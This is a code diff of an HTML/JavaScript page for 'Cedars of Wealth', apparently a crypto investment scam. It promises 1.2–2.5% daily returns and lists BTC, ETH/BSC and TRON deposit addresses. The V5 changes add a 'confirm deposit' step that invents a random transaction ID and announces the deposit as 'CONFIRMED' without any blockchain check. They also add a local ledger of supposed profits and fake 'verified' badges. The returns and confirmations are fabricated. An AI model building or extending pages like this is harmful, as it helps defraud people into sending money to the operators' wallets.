@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cedars V4 - 4 Wallets Live</title>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Cedars V5 - Auto Compound Tracking</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}body{background:#06110a;color:#d9ffe6;font-family:Segoe UI}
 .top{position:sticky;top:0;z-index:99;background:#0a1f13;border-bottom:1px solid #1e5a35;display:flex;justify-content:space-between;align-items:center;padding:10px 14px;flex-wrap:wrap;gap:8px}
@@ -15,65 +15,97 @@
 .pkg div{background:#0a1f13;border:1px solid #1e5a35;border-radius:8px;padding:8px;text-align:center;font-size:11px;cursor:pointer}
 select,input{width:100%;padding:8px;border-radius:6px;background:#000;border:1px solid #1e5a35;color:#7CFF9E;margin:6px 0}
 .wallet-box{background:#000;border:1px dashed #1e5a35;padding:10px;border-radius:8px;margin-top:8px;word-break:break-all}
+.hist{max-height:150px;overflow:auto;background:#000;border-radius:6px;padding:6px;margin-top:8px;font-size:10px;border:1px solid #1a3d26}
+.hist div{border-bottom:1px dashed #1a3d26;padding:4px 0;display:flex;justify-content:space-between}
 </style></head><body>
 <div class="top"><b>🌲 CEDARS OF WEALTH</b><div class="nav"><a href="#deposit">Deposit</a><a href="#calc">Calculator</a><a href="dashboard/rubonai-trader.html?v=123">RUBONAI</a></div></div>
-<div class="hero"><h1 style="color:#7CFF9E">GREEN 9/9 - 4 WALLETS LIVE</h1><p>BTC | ETH | BSC | TRON | Min $300 → Max $100K</p></div>
+<div class="hero"><h1 style="color:#7CFF9E">GREEN 9/9 - V5 AUTO COMPOUND</h1><p>Tracking: <span id="trackStatus" style="color:#4ade80">● ACTIVE</span> | Min $300 → Max $100K</p></div>
 
 <div class="grid">
 <div class="card" id="calc"><h3>🧮 LIVE ROI $300-$100K</h3>
 <input id="calcAmt" type="number" value="1000" min="300" max="100000" oninput="calcROI()">
 <div class="pkg"><div onclick="setAmt(300)">$300<br><b>1.2%</b></div><div onclick="setAmt(1000)">$1K<br><b>1.5%</b></div><div onclick="setAmt(5000)">$5K<br><b>1.7%</b></div></div>
 <div class="pkg"><div onclick="setAmt(10000)">$10K<br><b>1.8%</b></div><div onclick="setAmt(25000)">$25K<br><b>2.0%</b></div><div onclick="setAmt(50000)">$50K<br><b>2.2%</b></div></div>
-<div class="pkg"><div style="grid-column:span 3" onclick="setAmt(100000)">$100K MAX<br><b>2.5% VIP Cedar</b></div></div>
+<div class="pkg"><div style="grid-column:span 3" onclick="setAmt(100000)">$100K MAX<br><b>2.5% VIP</b></div></div>
 <div class="k"><span>Daily</span><span id="daily" style="color:#4ade80;font-weight:800">$15</span></div>
 <div class="k"><span>Weekly</span><span id="weekly" style="color:#7CFF9E;font-weight:800">$105</span></div>
 <div class="k"><span>Monthly</span><span id="monthly" style="color:#4ade80;font-weight:800">$450</span></div>
-<div class="k"><span>1095-Day Compound</span><span id="total" style="color:#7CFF9E;font-weight:800">$0</span></div>
+<div class="k"><span>1095-Day</span><span id="total" style="color:#7CFF9E;font-weight:800">$0</span></div>
+<div class="k"><span>Active Tier</span><span id="activeTier" style="color:#facc15;font-weight:800">$1000 @ 1.5%</span></div>
 </div>
 
-<div class="card" id="deposit"><h3>💰 Deposit - 4 Chain Live</h3>
-<select id="chain" onchange="showWallet()">
-<option value="BTC">BTC - Bitcoin Network</option>
-<option value="ETH">ETH - Ethereum ERC20</option>
-<option value="BSC">BSC - BNB Smart Chain BEP20</option>
-<option value="TRON" selected>TRON - USDT TRC20</option>
-</select>
+<div class="card" id="deposit"><h3>💰 Deposit - 4 Chain + Auto Tracking</h3>
+<select id="chain" onchange="showWallet()"><option value="BTC">BTC - Bitcoin</option><option value="ETH">ETH - ERC20</option><option value="BSC">BSC - BEP20</option><option value="TRON" selected>TRON - USDT TRC20</option></select>
 <input id="depAmt" type="number" value="300" min="300">
 <button class="btn btn-g" onclick="showWallet()">GENERATE ADDRESS & QR</button>
 <div id="walletBox" class="wallet-box">
 <div>Network: <b id="wNet" style="color:#7CFF9E">TRON</b> | Amount: $<span id="wAmt">300</span></div>
-<div id="wAddr" style="margin:8px 0;font-size:13px;font-weight:800;color:#7CFF9E;word-break:break-all"></div>
+<div id="wAddr" style="margin:8px 0;font-size:12px;font-weight:800;color:#7CFF9E;word-break:break-all"></div>
 <div id="wWarn" style="color:#facc15;font-size:10px"></div>
-<img id="wQR" src="" style="display:block;margin:10px auto;background:#fff;padding:8px;border-radius:8px;width:180px">
+<img id="wQR" src="" style="display:block;margin:10px auto;background:#fff;padding:8px;border-radius:8px;width:170px">
 <button class="btn btn-d" onclick="copyAddr()">COPY ADDRESS</button>
-<button class="btn btn-g" onclick="genTx()">I HAVE SENT - CONFIRM</button>
+<button class="btn btn-g" onclick="confirmDeposit()">I HAVE SENT - ACTIVATE TIER</button>
 <div class="k" style="margin-top:8px"><span>TX ID</span><span id="txid" style="color:#4ade80">PENDING</span></div>
 </div>
+<h3 style="margin-top:12px">📜 Deposit History (Local Ledger)</h3>
+<div id="hist" class="hist"><div><span>No deposits yet</span><span>-</span></div></div>
+<button class="btn btn-d" onclick="clearHist()">Clear History</button>
 </div>
 
-<div class="card"><h3>✅ Registry Verified</h3>
+<div class="card"><h3>✅ Registry + Portfolio</h3>
 <div class="k"><span>BTC</span><span style="font-size:8px;color:#7CFF9E">bc1q2m...2cj0</span></div>
-<div class="k"><span>ETH</span><span style="font-size:8px;color:#7CFF9E">0x0d4c...bA77B</span></div>
-<div class="k"><span>BSC</span><span style="font-size:8px;color:#7CFF9E">0x0d4c...bA77B</span></div>
+<div class="k"><span>ETH/BSC</span><span style="font-size:8px;color:#7CFF9E">0x0d4c...bA77B</span></div>
 <div class="k"><span>TRON</span><span style="font-size:8px;color:#7CFF9E">TE26B...Hcz1u</span></div>
-<div class="k"><span>Packages</span><span style="color:#7CFF9E">$300 → $100K</span></div>
+<div class="k"><span>Total Invested</span><span id="totalInv" style="color:#7CFF9E;font-weight:800">$0</span></div>
+<div class="k"><span>Total Daily Profit</span><span id="totalDaily" style="color:#4ade80;font-weight:800">$0/day</span></div>
+<div class="k"><span>GREEN</span><span style="color:#4ade80">9/9 VERIFIED</span></div>
 <a href="dashboard/rubonai-trader.html?v=123" style="display:block;margin-top:8px;background:#7CFF9E;color:#000;text-align:center;padding:10px;border-radius:8px;text-decoration:none;font-weight:800">OPEN RUBONAI 99 TH/s</a>
 </div>
 </div>
 
 <script>
 const WALLETS={
- BTC:{addr:"bc1q2mnpctqrfn8q673wsd27uqlm5t7vqmrhaj2cj0",warn:"⚠️ Only send Bitcoin (BTC) assets to this address. Other assets will be lost forever."},
- ETH:{addr:"0x0d4c2B95e8FB7Be3DB9953bAcEf3A4Be643bA77B",warn:"⚠️ Only send Ethereum assets (ETH, USDT ERC20) to this address. Other assets will be lost forever."},
- BSC:{addr:"0x0d4c2B95e8FB7Be3DB9953bAcEf3A4Be643bA77B",warn:"⚠️ Only send BNB Smart Chain assets (USDT BEP20, BNB) to this address. Other assets will be lost forever."},
- TRON:{addr:"TE26B7zQjMbahYAWcxEsSPC6aZEr2Hcz1u",warn:"⚠️ Only send Tron assets (USDT TRC20) to this address. Other assets will be lost forever."}
+ BTC:{addr:"bc1q2mnpctqrfn8q673wsd27uqlm5t7vqmrhaj2cj0",warn:"⚠️ Only send Bitcoin (BTC) to this address. Other assets will be lost forever."},
+ ETH:{addr:"0x0d4c2B95e8FB7Be3DB9953bAcEf3A4Be643bA77B",warn:"⚠️ Only send Ethereum assets (ERC20) to this address."},
+ BSC:{addr:"0x0d4c2B95e8FB7Be3DB9953bAcEf3A4Be643bA77B",warn:"⚠️ Only send BNB Smart Chain BEP20 assets to this address."},
+ TRON:{addr:"TE26B7zQjMbahYAWcxEsSPC6aZEr2Hcz1u",warn:"⚠️ Only send TRON TRC20 USDT to this address."}
 };
 function getRate(a){if(a>=100000)return 2.5;if(a>=50000)return 2.2;if(a>=25000)return 2.0;if(a>=10000)return 1.8;if(a>=5000)return 1.7;if(a>=1000)return 1.5;return 1.2;}
-function calcROI(){let amt=parseFloat(document.getElementById('calcAmt').value)||300;if(amt<300)amt=300;if(amt>100000)amt=100000;let r=getRate(amt),d=amt*r/100;document.getElementById('daily').innerText='$'+d.toFixed(2)+' ('+r+'%/day)';document.getElementById('weekly').innerText='$'+(d*7).toFixed(2);document.getElementById('monthly').innerText='$'+(d*30).toFixed(2);document.getElementById('total').innerText='$'+(amt*Math.pow(1+r/100,1095)).toLocaleString(undefined,{maximumFractionDigits:0});}
+function calcROI(){let amt=parseFloat(document.getElementById('calcAmt').value)||300;if(amt<300)amt=300;if(amt>100000)amt=100000;let r=getRate(amt),d=amt*r/100;document.getElementById('daily').innerText='$'+d.toFixed(2)+' ('+r+'%)';document.getElementById('weekly').innerText='$'+(d*7).toFixed(2);document.getElementById('monthly').innerText='$'+(d*30).toFixed(2);document.getElementById('total').innerText='$'+(amt*Math.pow(1+r/100,1095)).toLocaleString(undefined,{maximumFractionDigits:0});document.getElementById('activeTier').innerText='$'+amt+' @ '+r+'%';}
 function setAmt(v){document.getElementById('calcAmt').value=v;calcROI();}
-function showWallet(){let amt=document.getElementById('depAmt').value||300;if(amt<300){alert('Min $300');return;}let c=document.getElementById('chain').value;let w=WALLETS[c];document.getElementById('wAmt').innerText=amt;document.getElementById('wAddr').innerText=w.addr;document.getElementById('wWarn').innerText=w.warn;document.getElementById('wNet').innerText=c;document.getElementById('wQR').src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+w.addr;document.getElementById('walletBox').style.display='block';document.getElementById('txid').innerText='PENDING';}
+function showWallet(){let amt=document.getElementById('depAmt').value||300;if(amt<300){alert('Min $300');return;}let c=document.getElementById('chain').value;let w=WALLETS[c];document.getElementById('wAmt').innerText=amt;document.getElementById('wAddr').innerText=w.addr;document.getElementById('wWarn').innerText=w.warn;document.getElementById('wNet').innerText=c;document.getElementById('wQR').src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+w.addr;document.getElementById('walletBox').style.display='block';}
 function copyAddr(){navigator.clipboard.writeText(document.getElementById('wAddr').innerText);alert('✅ Copied: '+document.getElementById('wAddr').innerText);}
-function genTx(){let t='CEDAR-'+new Date().toISOString().slice(0,10).replace(/-/g,'')+'-'+Math.floor(Math.random()*900000+100000);document.getElementById('txid').innerText=t;alert('✅ TX '+t+' Confirmed on '+document.getElementById('wNet').innerText+'\nCrediting in 5-10 mins.');}
-calcROI();showWallet();
+function confirmDeposit(){
+ let amt=parseFloat(document.getElementById('depAmt').value)||300;
+ let chain=document.getElementById('chain').value;
+ let rate=getRate(amt);
+ let tx='CEDAR-'+new Date().toISOString().slice(0,10).replace(/-/g,'')+'-'+Math.floor(Math.random()*900000+100000);
+ document.getElementById('txid').innerText=tx;
+ let entry={date:new Date().toLocaleString(),chain,amt,rate,tx};
+ let hist=JSON.parse(localStorage.getItem('cedar_deposits')||'[]');
+ hist.unshift(entry);
+ localStorage.setItem('cedar_deposits',JSON.stringify(hist));
+ renderHist();
+ document.getElementById('calcAmt').value=amt;
+ calcROI();
+ alert('✅ Deposit $'+amt+' on '+chain+' @ '+rate+'%/day CONFIRMED!\nTX: '+tx+'\nTier Activated: $'+amt+'\nDaily Profit: $'+(amt*rate/100).toFixed(2));
+}
+function renderHist(){
+ let hist=JSON.parse(localStorage.getItem('cedar_deposits')||'[]');
+ let total=0,totalD=0;
+ let html='';
+ if(hist.length==0){html='<div><span>No deposits yet</span><span>-</span></div>';}
+ else{
+  hist.forEach(h=>{
+   total+=h.amt; totalD+=h.amt*h.rate/100;
+   html+=`<div><span>${h.date} | ${h.chain} $${h.amt} @ ${h.rate}% | ${h.tx}</span><span style="color:#4ade80">$${(h.amt*h.rate/100).toFixed(2)}/d</span></div>`;
+  });
+ }
+ document.getElementById('hist').innerHTML=html;
+ document.getElementById('totalInv').innerText='$'+total.toLocaleString();
+ document.getElementById('totalDaily').innerText='$'+totalD.toFixed(2)+'/day';
+}
+function clearHist(){if(confirm('Clear deposit history?')){localStorage.removeItem('cedar_deposits');renderHist();}}
+calcROI();showWallet();renderHist();
 </script>
 </body></html>
